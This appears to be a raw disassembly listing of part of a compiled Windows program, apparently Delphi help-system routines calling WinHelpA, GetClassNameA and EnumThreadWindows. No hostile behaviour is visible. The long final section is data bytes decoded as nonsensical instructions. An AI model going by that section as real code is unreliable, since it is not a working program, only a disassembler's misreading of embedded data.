push sub_4343fb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_434288
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434402
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_43440c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_434494
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_434380
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4041d4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43449b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
sub_4344a7
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43452f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_434bcc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434536
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_434288
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4344b4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43452f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_434bcc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434536
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_434288
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43453c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434634
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_434288
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408be0
mov eax ebx
call sub_434bcc
test al al
je r-xdata
mov ecx sub_4340dc
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43463b
lea eax [ ebp - 0x1c ]
call sub_403e54
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_434288
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_434b24
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403ea8
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404314
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4346a4
push ebx
mov ebx eax
mov eax ebx
call sub_434688
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4054f4
pop ebx
retn
mov eax rw-data
call sub_4054f4
sub_4346d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43472c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434733
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_434288
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_43473c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434832
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408ba0
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_434288
mov eax ebx
call sub_434bcc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434839
lea eax [ ebp - 0x110 ]
call sub_403e54
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4040c4
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_434b24
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4040c4
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_434850
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4348b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4348b9
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_434288
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_4348c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434944
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_434288
mov eax ebx
call sub_434bcc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43494b
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_434b24
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_434954
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_434a3f
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_434bcc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434a46
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403e78
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407d78
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_434b24
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407d78
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403ea8
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_434288
mov eax [ ebp - 0x14 ]
call sub_404314
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_434a54
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408604
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_434aaf
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4085e0
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_434b24
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404304
xor eax eax
push ebp
push sub_434b9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_434b08
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434ba1
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407aa0
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_434bb0
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_434bcc
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_434b08
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_434bac
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_434bb0
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_434c28
sub_434c28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_434ca5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_434688
call GetTickCount
mov ebx eax
push 0x0
call sub_406048
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_434288
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434cac
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_434cb4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403428
call sub_40550c
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_434cfc
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_434d28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434d96
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434d9d
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4054f4
mov eax rw-data
call sub_4054f4
mov eax rw-data
call sub_4054f4
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_4054f4
mov eax [ rw-data ]
call sub_434358
sub_434da0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434df2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434df9
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_434cb4
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4054f4
mov edx eax
mov eax [ rw-data ]
call sub_425030
sub_434dfc
add [ esi + 0x43 ] cl
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
fdivr [ eax + 0x43 ]
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
nop
sbb al 0x4e
inc ebx
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc eax
add al bl
dec esi
inc ebx
add [ eax ] al
add [ eax ] al
dec esi
inc ebx
add [ eax + eax ] dh
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
cmp [ ecx + 0x43 ] bh
add [ eax ] ch
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
jae r-xdata
inc edx
popad
jae r-xdata
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
les edi [ ecx + 0x43 ]
add [ eax + edi * 2 + 0x78b00043 ] dh
inc ebx
add [ edi + esi * 2 + 0x796c0043 ] dh
inc ebx
add [ eax + 0x77 ] bh
inc ebx
add ah cl
js r-xdata
add al bl
js r-xdata
outsd
insb
jae r-xdata
arpl [ esp + ecx + 0x4f ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx * 8 + 0x4e ] si
inc ebx
add ah dh
adc [ eax ] al
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
jb r-xdata
add [ eax + edx * 2 + 0x43 ] ch
inc esp
jb r-xdata
arpl [ esp + edi * 2 + 0x4f ] si
add al dl
js r-xdata
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
add [ eax + 0x48004379 ] bl
jns r-xdata
add [ ebx + 0x434f7cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c00434f ] ch
add [ eax ] al
add [ esi + ecx * 2 + 0x334c0043 ] cl
inc eax
add [ eax ] bh
jns r-xdata
dec edi
inc ebx
add [ eax + edi * 2 + 0x78b00043 ] dh
inc ebx
add [ edi + esi * 2 + 0x77180043 ] dh
inc ebx
add [ eax + 0x77 ] bh
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
xor al 0x4e
inc ebx
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax ] dh
dec esi
inc ebx
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
xor [ edi + 0x43 ] cl
add [ ebx + esi + 0x40 ] cl
add [ eax ] bh
jns r-xdata
add [ eax ] al
insb
push eax
inc ebx
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
insb
jae r-xdata
inc ebx
add [ eax ] cl
dec edi
je r-xdata
add [ esi ] dl
push esp
inc ebx
add [ eax ] ch
jns r-xdata
inc ebx
add [ eax + eax ] bh
add [ eax ] al
mov [ esi + 0x43 ] cs
add [ ebx + esi + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add al dl
js r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ebx
inc ebx
outsd
outsb
je r-xdata
inc esp
jb r-xdata
add [ eax + 0x33 ] ah
inc eax
jns r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x3c ] si
dec edi
inc ebx
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
inc eax
add [ eax ] bh
jns r-xdata
add [ edx ] dl
push esp
add [ ebp + 0x50400040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
js r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor [ eax ] al
hlt
outsd
insd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x796c0043 ] dh
inc ebx
add [ eax + 0x77 ] bh
inc ebx
add [ edx + edi * 2 ] bl
inc ebx
add al dl
js r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x34 ] si
push eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
push eax
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jpe r-xdata
xor [ eax ] al
les edi [ ecx + 0x43 ]
add al bh
jns r-xdata
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
inc esp
jb r-xdata
inc ebx
add [ edx + edi * 2 + 0x43 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
les edi [ ecx + 0x43 ]
add al bh
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x4f
add [ ebx ] cl
push esp
inc esp
jb r-xdata
int3
je r-xdata
inc ebx
add [ eax + 0x1400437b ] bl
jl r-xdata
add [ eax ] ch
jns r-xdata
add [ eax ] al
cwde
push ecx
inc ebx
add [ eax ] dh
add [ eax ] al
xor [ edi + 0x43 ] cl
add [ edx + edi * 2 ] bh
inc ebx
add [ eax + 0x48004379 ] bl
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
add [ edi + esi * 2 + 0x796c0043 ] dh
inc ebx
add [ eax + 0x77 ] bh
inc ebx
add [ edx + edi * 2 ] bl
inc ebx
add al dl
js r-xdata
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
inc ebx
outsd
outsb
je r-xdata
inc ebx
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jpe r-xdata
inc ebx
add ah cl
js r-xdata
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
mov eax eax
and [ edx + 0x43 ] dl
add [ eax ] ch
jl r-xdata
inc ebx
add [ esp + edi * 2 ] dl
inc ebx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah al
jpe r-xdata
add [ ebx + esi + 0x40 ] cl
add [ eax ] bh
jns r-xdata
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
hlt
add [ edx + edi * 2 ] bh
inc ebx
add [ eax + 0x48004379 ] bl
jns r-xdata
inc ebx
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
push esp
inc esp
jb r-xdata
add ah dh
jpe r-xdata
js r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
pop esp
push ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70004351 ] bl
add [ eax ] al
add [ eax ] dh
dec edi
inc ebx
add [ eax + 0x1400437b ] bl
jl r-xdata
add [ eax + 0x7c ] dl
inc ebx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 2 + 0x43 ] bl
add [ eax ] dh
add [ eax ] al
adc [ ecx + 0x43 ] dl
inc ebx
add [ eax + 0x7c ] cl
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
inc esp
add ah al
jns r-xdata
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah al
jpe r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 2 + 0x51 ] si
add [ eax + 0x77 ] bh
inc ebx
add ah cl
inc ebx
add al al
arpl [ gs : esp + ebx * 2 + 0x51 ] si
add al dl
js r-xdata
add [ eax ] al
and [ esi + 0x334c0041 ] dh
inc eax
add [ eax ] ch
jl r-xdata
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax ] ah
mov es [ ebx ]
or al 0x44
inc esp
add ah al
jns r-xdata
add [ ebx + esi + 0x40 ] cl
add [ eax ] bh
jns r-xdata
inc ebx
outsd
arpl [ ebx + 0x4f ] bp
inc esp
add al bl
js r-xdata
outsd
insb
jae r-xdata
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 4 + 0x51 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
dec edi
add [ esp + edi * 2 ] bh
inc ebx
add [ eax - 0x4bffbc88 ] dh
ja r-xdata
push ecx
add al bl
js r-xdata
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xb0004030
mov al [ 0xffffffff90900041 ]
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + esi + 0x40 ] cl
inc ecx
add [ eax + 0x7c ] cl
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
mov esp 0x4352
dec edi
add [ esp + edi * 2 ] bh
inc ebx
add [ eax - 0x4bffbc88 ] dh
ja r-xdata
inc ebx
add [ eax + eax ] ah
add [ eax ] ah
mov dh 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x52
add [ eax + 0x7b ] dl
inc ebx
add [ eax + 0x7a ] ah
add [ ebx + 0x435220c0 ] cl
dec edi
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x7b ] dl
inc ebx
add [ eax + 0x7a ] ah
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4353f090
add [ ebx ] al
or al 0x54
inc ebx
add ah ah
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax - 0x6fffbe60 ] dh
nop
jae r-xdata
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ eax - 0x7bffbe24 ] bl
fadd [ ecx ]
dec esp
mov es [ ebx ]
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push edx
inc ebx
add [ eax ] al
add ah dh
jpe r-xdata
add [ esp + edx * 2 + 0x64060043 ] dh
imul eax [ edx + esi * 2 + 0x61 ] 0x67
outsd
insd
popad
je r-xdata
inc ebx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
push edx
add [ eax ] al
call 0x743963b
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] bh
inc ebx
